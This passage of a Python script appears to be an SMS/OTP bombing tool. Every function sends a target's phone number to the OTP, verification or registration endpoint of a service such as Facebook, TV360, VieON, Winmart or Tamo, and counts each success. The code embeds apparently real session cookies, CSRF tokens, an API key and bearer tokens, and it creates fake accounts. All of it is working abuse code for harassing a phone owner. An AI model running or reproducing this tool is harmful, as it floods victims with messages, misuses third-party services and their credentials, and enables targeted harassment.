    if '200' in response.text:
        print(format_print("$","MYVIETTEL: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","MYVIETTEL: THẤT BẠI"))
def facebook(phone):
    global thanhcong
    cookies = {
        'datr': 'Y7F4ZBCo4-qVo9xls1ExLi9Q',
        'locale': 'vi_VN',
        'sb': 'Y7F4ZA-VC3w9oC6ztbEuQAJc',
        'dpr': '0.8999999761581421',
        'c_user': '100093456605541',
        'xs': '11%3A-MeeQh3zh8n6_g%3A2%3A1686039273%3A-1%3A-1',
        'fr': '0N0dlC1UpcEer2Se4.AWW0h_CuTqXLctaNE1Xh508-dj4.BkfurQ.zV.AAA.0.0.Bkfurr.AWXP4Jj5P18',
        'presence': 'C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1686039311394%2C%22v%22%3A1%7D',
        'wd': '1148x694',
    }

    headers = {
        'authority': 'www.facebook.com',
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
         'cookie': 'datr=Y7F4ZBCo4-qVo9xls1ExLi9Q; locale=vi_VN; sb=Y7F4ZA-VC3w9oC6ztbEuQAJc; dpr=0.8999999761581421; c_user=100093456605541; xs=11%3A-MeeQh3zh8n6_g%3A2%3A1686039273%3A-1%3A-1; fr=0N0dlC1UpcEer2Se4.AWW0h_CuTqXLctaNE1Xh508-dj4.BkfurQ.zV.AAA.0.0.Bkfurr.AWXP4Jj5P18; presence=C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1686039311394%2C%22v%22%3A1%7D; wd=1148x694',
        'dnt': '1',
        'origin': 'https://www.facebook.com',
        'referer': 'https://www.facebook.com/settings?tab=mobile&cquick=jsc_c_1&cquick_token=AQ53WsCi8VE8o-Btfwc&ctarget=https%3A%2F%2Fwww.facebook.com',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        'sec-ch-ua-full-version-list': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.110", "Google Chrome";v="114.0.5735.110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"10.0.0"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'viewport-width': '770',
        'x-asbd-id': '198387',
        'x-fb-lsd': 'puYS9cl5yWwTxM5LEU-88r',
    }

    data = {
        'cquick_token': 'AQ53WsCi8VE8o-Btfwc',
        'ctarget': 'https://www.facebook.com',
        'cquick': 'jsc_c_1',
        'jazoest': '25613',
        'fb_dtsg': 'NAcMfqFKk0MvlLj0iLGFtyjY9srUB2ZLsxvA408RBsfjYDIoSztbpvA:11:1686039273',
        'country': 'VN',
        'contact_point': phone,
        'verification_type': 'code_sms',
        'state': '1',
        'source': 'www_mobile_settings',
        '__user': '100093456605541',
        '__a': '1',
        '__req': '2',
        '__hs': '19514.BP:DEFAULT.2.0..0.0',
        'dpr': '1',
        '__ccg': 'EXCELLENT',
        '__rev': '1007625358',
        '__s': 'o56d90:at4rod:w8y56w',
        '__hsi': '7241483722010204076',
        '__dyn': '7xu5Fo4OQ1PyUbAjFwn84a2i5U4e1Fx-ewSwMxW0DUS2S0lW4o3BwbC0LVE4W0y8460KEswIwuo5-2G1Qw5Mx61vwnE2PwOxS2218w4wwZwaO0OU3mwkE5G0zE5W0HUvw6ixy0gq0Lo6-1FwbO0NE',
        '__csr': '',
        'lsd': 'puYS9cl5yWwTxM5LEU-88r',
        '__spin_r': '1007625358',
        '__spin_b': 'trunk',
        '__spin_t': '1686039316',
    }

    response = requests.post('https://www.facebook.com/ajax/phone/confirmation', cookies=cookies, headers=headers, data=data)
    if '"payload":null' in response.text:
        print(format_print("$","FACEBOOK: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","FACEBOOK: THẤT BẠI"))
def random_string(length):
    import random
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    result = ""
    for _ in range(length):
        result += random.choice(characters)
    return result
random_str = random_string(10)
random_str1 = random_string(3)
z = random_string(40)
tk=random_string(10)
mk=random_string(20)
def pop(phone):
    global thanhcong
    headers = {
        'authority': 'products.popsww.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'access-control-request-headers': 'api-key,content-type,lang,platform,profileid,sub-api-version,x-env',
        'access-control-request-method': 'POST',
        'origin': 'https://pops.vn',
        'referer': 'https://pops.vn/auth/signin-signup/signup',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    response = requests.options('https://products.popsww.com/api/v5/auths/register', headers=headers)


    headers = {
        'authority': 'products.popsww.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'api-key': '5d2300c2c69d24a09cf5b09b',
        'content-type': 'application/json',
        'lang': 'vi',
        'origin': 'https://pops.vn',
        'platform': 'web',
        'profileid': '646e6129cee22400550f4a07',
        'referer': 'https://pops.vn/auth/signin-signup/signup',
        'sec-ch-ua': '"Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'sub-api-version': '1.1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-env': 'production',
    }

    json_data = {
        'fullName': 'Le van ' + random_str1 ,
        'account': phone,
        'password': random_str,
        'confirmPassword': random_str,
    }
    response = requests.post('https://products.popsww.com/api/v5/auths/register', headers=headers, json=json_data)
    if '"status":"PENDING"'in response.text:
        print(format_print("$","POP: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","POP: THẤT BẠI"))
def tv360(phone):
    global thanhcong
    cookies = {
        'acw_tc': '214dc882ed025485d1323276446e110645d1ded66e41df640a1824a336edaef5',
        'img-ext': 'avif',
        '_gid': 'GA1.2.1285984074.1685327506',
        '_gat_UA-180935206-1': '1',
        '_ga': 'GA1.1.857260919.1685327506',
        'device-id': 's%3Aweb_a1c1c9cf-a316-4629-8218-fe93e991418f.Ord2T5a4BVKXoVkRQRJ%2BGkQ3foglgzunOyROv2qi20U',
        'shared-device-id': 'web_a1c1c9cf-a316-4629-8218-fe93e991418f',
        'screen-size': 's%3A1366x768.IiD9nRz2OL3IyaPE2ac97JfqfV3HiT2hZFjjk11x658',
        'G_ENABLED_IDPS': 'google',
        'session-id': 's%3A64b09b79-e256-4322-9c4f-7a7bd68cfaf7.Z69cXhHq0xD0Qce9uVKcelrv4gzv%2Fa7i1V%2BWwrYfbWs',
        '_ga_D7L53J0JMS': 'GS1.1.1685327506.1.1.1685327563.3.0.0',
        '_ga_E5YP28Y8EF': 'GS1.1.1685327506.1.1.1685327563.0.0.0',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
         'Cookie': 'acw_tc=214dc882ed025485d1323276446e110645d1ded66e41df640a1824a336edaef5; img-ext=avif; _gid=GA1.2.1285984074.1685327506; _gat_UA-180935206-1=1; _ga=GA1.1.857260919.1685327506; device-id=s%3Aweb_a1c1c9cf-a316-4629-8218-fe93e991418f.Ord2T5a4BVKXoVkRQRJ%2BGkQ3foglgzunOyROv2qi20U; shared-device-id=web_a1c1c9cf-a316-4629-8218-fe93e991418f; screen-size=s%3A1366x768.IiD9nRz2OL3IyaPE2ac97JfqfV3HiT2hZFjjk11x658; G_ENABLED_IDPS=google; session-id=s%3A64b09b79-e256-4322-9c4f-7a7bd68cfaf7.Z69cXhHq0xD0Qce9uVKcelrv4gzv%2Fa7i1V%2BWwrYfbWs; _ga_D7L53J0JMS=GS1.1.1685327506.1.1.1685327563.3.0.0; _ga_E5YP28Y8EF=GS1.1.1685327506.1.1.1685327563.0.0.0',
        'Origin': 'http://tv360.vn',
        'Referer': 'http://tv360.vn/login?r=http%3A%2F%2Ftv360.vn%2F',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post(
        'http://tv360.vn/public/v1/auth/get-otp-login',
        cookies=cookies,
        headers=headers,
        json=json_data,
        verify=False,
    )
    if '200' in response.text:
        print(format_print("$","TV360: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","TV360: THẤT BẠI"))
def meta(phone):
    global thanhcong
    cookies = {
        '_ssid': 'aggdh2hhalmqx5oq2aagzwqs',
        '_cart_': '23c606fe-c0c3-42eb-8c3f-e829ebca7ec1',
        '__ckmid': '8d30c7a2b7454b67a3441f3f1d1f632c',
        '_gcl_au': '1.1.1985347082.1685327965',
        '_gid': 'GA1.2.1851582784.1685327965',
        '_gat_gtag_UA_1035222_8': '1',
        '_gat_UA-1035222-8': '1',
        '_ga': 'GA1.2.1183341234.1685327965',
        '_ga_L0FCVV58XQ': 'GS1.1.1685327964.1.1.1685327974.0.0.0',
    }

    headers = {
        'authority': 'meta.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
         'cookie': '_ssid=aggdh2hhalmqx5oq2aagzwqs; _cart_=23c606fe-c0c3-42eb-8c3f-e829ebca7ec1; __ckmid=8d30c7a2b7454b67a3441f3f1d1f632c; _gcl_au=1.1.1985347082.1685327965; _gid=GA1.2.1851582784.1685327965; _gat_gtag_UA_1035222_8=1; _gat_UA-1035222-8=1; _ga=GA1.2.1183341234.1685327965; _ga_L0FCVV58XQ=GS1.1.1685327964.1.1.1685327974.0.0.0',
        'origin': 'https://meta.vn',
        'referer': 'https://meta.vn/account/register',
        'sec-ch-ua': '"Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    params = {
        'api_mode': '1',
    }

    json_data = {
        'api_args': {
            'lgUser': phone,
            'act': 'send',
            'type': 'phone',
        },
        'api_method': 'CheckExist',
    }

    response = requests.post(
        'https://meta.vn/app_scripts/pages/AccountReact.aspx',
        params=params,
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    if "send_ok" in response.text:
        print(format_print("$","META: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","META: THẤT BẠI"))

def oldloship(phone):
    global thanhcong
    response = requests.post("https://mocha.lozi.vn/v6/invites/use-app", headers={"Host": "mocha.lozi.vn","content-length": "47","x-city-id": "50","accept-language": "vi_VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36","content-type": "application/json","x-lozi-client": "1","x-access-token": "unknown","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://loship.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://loship.vn","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"device":"Android 8.1.0","platform":"Chrome/104.0.0.0","countryCode":"84","phoneNumber":phone[1:11]}))
    if response.status_code == 200:
        print(format_print("$","LOSHIP: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","LOSHIP: THẤT BẠI"))

def oldfptshop(phone):
    global thanhcong
    response = requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone})
    if response.status_code == 200:
        print(format_print("$","FPTSHOP: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","FPTSHOP: THẤT BẠI"))

def oldzalopay(phone):
    global thanhcong
    print(format_print("$","ZALOPAY: THẤT BẠI"))
# New Api Filter

def vieon(phone):
    global thanhcong
    Headers = {"Host": "api.vieon.vn","content-length": "201","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://vieon.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vieon.vn/?utm_source\u003dgoogle\u0026utm_medium\u003dcpc\u0026utm_campaign\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite\u0026utm_content\u003dp_--k_vieon\u0026pid\u003dapproi\u0026c\u003dapproi_VieON_SEM_Brand_BOS_Exact\u0026af_adset\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B\u0026af_force_deeplink\u003dfalse\u0026gclid\u003dCjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Params = {"platform": "mobile_web","ui": "012021"}
    Payload = {"phone_number": phone,"password": "Vexx007","given_name": "","device_id": "7c775cd1cd49a31c3893ca1e09abbde3","platform": "mobile_web","model": "Android%2010","push_token": "","device_name": "Chrome%2F110","device_type": "desktop","ui": "012021"}
    response = requests.post("https://api.vieon.vn/backend/user/register/mobile", params=Params, data=Payload, headers=Headers)
    if response.status_code == 200:
        print(format_print("$","VIEON: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","VIEON: THẤT BẠI"))

def concung(phone):
    global thanhcong
    Headers = {"Host": "concung.com","content-length": "121","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://concung.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://concung.com/dang-nhap.html","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_BBD6001M29\u003dGS1.1.1679234342.1.1.1679234352.50.0.0"}
    Payload = {"ajax": "1","classAjax": "AjaxLogin","methodAjax": "sendOtpLogin","customer_phone": phone,"id_customer": "0","momoapp": "0","back": "khach-hang.html"}
    response = requests.post("https://concung.com/ajax.html", data=Payload, headers=Headers)
    if response.status_code == 200:
        print(format_print("$","CONCUNG: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","CONCUNG: THẤT BẠI"))

def vietid(phone):
    global thanhcong
    csrfget = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F").text
    csrf = csrfget.split('name="csrf-token" value="')[1].split('"/>')[0]
    Headers = {"Host": "oauth.vietid.net","content-length": "41","cache-control": "max-age\u003d0","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","upgrade-insecure-requests": "1","origin": "https://oauth.vietid.net","content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_H5VRTZBFLG\u003dGS1.1.1679234987.1.0.1679234987.0.0.0"}
    Payload = {"csrf-token": csrf,"account": phone}
    response = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F", data=Payload, headers=Headers)
    if response.status_code == 200:
        print(format_print("$","VIETID: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","VIETID: THẤT BẠI"))

def gotadi(phone):
    global thanhcong
    Headers = {"Host": "api.gotadi.com","content-length": "44","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json","sec-ch-ua-platform": "\"Android\"","gtd-client-tracking-device-id": "85519cab-85d7-4881-abfa-65d2a2bb3a52","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","content-type": "application/json","origin": "https://www.gotadi.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.gotadi.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"phoneNumber": phone,"language":"VI"})
    response = requests.post("https://api.gotadi.com/b2c-web/api/register/phone-number/resend-otp", data=Datason, headers=Headers)
    if response.status_code == 200:
        print(format_print("$","GOTADI: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","GOTADI: THẤT BẠI"))

def winmart(phone):
    global thanhcong
    response = requests.get(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={phone}")
    if response.status_code == 200:
        print(format_print("$","WINMART: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","WINMART: THẤT BẠI"))

# Old - New Api [ Call ] Filter

def oldvayvnd(phone):
    global thanhcong
    response = requests.post("https://api.vayvnd.vn/v1/users/password-reset", headers={"Host": "api.vayvnd.vn","content-length": "22","accept": "application/json","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://vayvnd.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vayvnd.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"login": phone}))
    if response.status_code == 200:
        print(format_print("$","VAYVND: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","VAYVND: THẤT BẠI"))

def oldtamo(phone):
    global thanhcong
    response = requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts", headers={"Host": "api.tamo.vn","content-length": "39","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://www.tamo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.tamo.vn/","accept-encoding": "gzip, deflate, br"}, json=({"mobilePhone":{"number": phone}}))
    if response.status_code == 200:
        print(format_print("$","TAMO: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","TAMO: THẤT BẠI"))


def atmonline(phone):
    global thanhcong
    Headers = {"Host": "atmonline.com.vn","content-length": "46","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json","sec-ch-ua-mobile": "?1","authorization": "","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://atmonline.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://atmonline.com.vn/portal-new/login?mobilePhone\u003d0777531398\u0026requestedAmount\u003d4000000\u0026requestedTerm\u003d4\u0026locale\u003dvn\u0026designType\u003dNEW","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_181P8FC3KD\u003dGS1.1.1681739176.1.1.1681739193.43.0.0"}
    Datason = json.dumps({"mobilePhone": phone,"source":"ONLINE"})
    response = requests.post("https://atmonline.com.vn/back-office/api/json/auth/sendAcceptanceCode",  data=Datason, headers=Headers)
    if response.status_code == 200:
        print(format_print("$","ATMONLINE: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","ATMONLINE: THẤT BẠI"))
def gkitchen(phone):
    global thanhcong
    headers = {
    'authority': 'stagingapi.gkitchen.com.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'clientid': '0',
    'content-type': 'application/json;charset=UTF-8',
    'device-id': '8841ad1d-0bc7-4e47-ac05-4c29fb1fa7fa',
    'devicename': 'Web',
    'dnt': '1',
    'hashcode': '288d73810e5c7231e115d656de7fea9d',
    'origin': 'https://www.gkitchen.com',
    'referer': 'https://www.gkitchen.com/',
    'request-id': '22293c55-8eb8-455e-93b7-4dd441237323',
    'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    'versionapp': 'Web GKitchen 2.0',
    'versionos': 'Reactjs 17.0.0',
        }

    json_data = {
        'phone': phone,
    }
    response = requests.post('https://stagingapi.gkitchen.com.vn/v1/auth/registerSendCodeOTP', headers=headers, json=json_data)
    if 'true' in response.text:
        print(format_print("$","GKITCHEN: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","GKITCHEN: THẤT BẠI"))
def topenland(phone):
    global thanhcong
    cookies = {
        '_ga': 'GA1.1.1240548068.1685334227',
        'ajs_anonymous_id': '7ffd6094-267f-4e03-b603-aaa86cf10cc0',
        'ApplicationGatewayAffinityCORS': 'e3a3e7f76978c3189d076edb90ce010d',
        'ApplicationGatewayAffinity': 'e3a3e7f76978c3189d076edb90ce010d',
        '_ga_05MHVHMYGR': 'GS1.1.1685334227.1.1.1685334235.0.0.0',
    }

    headers = {
        'authority': 'topenland.com',
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
         'cookie': '_ga=GA1.1.1240548068.1685334227; ajs_anonymous_id=7ffd6094-267f-4e03-b603-aaa86cf10cc0; ApplicationGatewayAffinityCORS=e3a3e7f76978c3189d076edb90ce010d; ApplicationGatewayAffinity=e3a3e7f76978c3189d076edb90ce010d; _ga_05MHVHMYGR=GS1.1.1685334227.1.1.1685334235.0.0.0',
        'dnt': '1',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    params = {
        'phoneNumber': phone,
    }

    response = requests.get(
        'https://topenland.com/_next/data/VL6b140TPQ9AMHJ2DqgBU/vi/sign-up/verify-otp.json',
        params=params,
        cookies=cookies,
        headers=headers,
    )
    print(format_print("$","TOPENLAND: THÀNH CÔNG"))
    thanhcong+=1
def pharmacity(phone):
    global thanhcong
    headers = {
        'authority': 'data-service.pharmacity.io',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'dnt': '1',
        'referer': 'https://www.pharmacity.vn/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    response = requests.get(
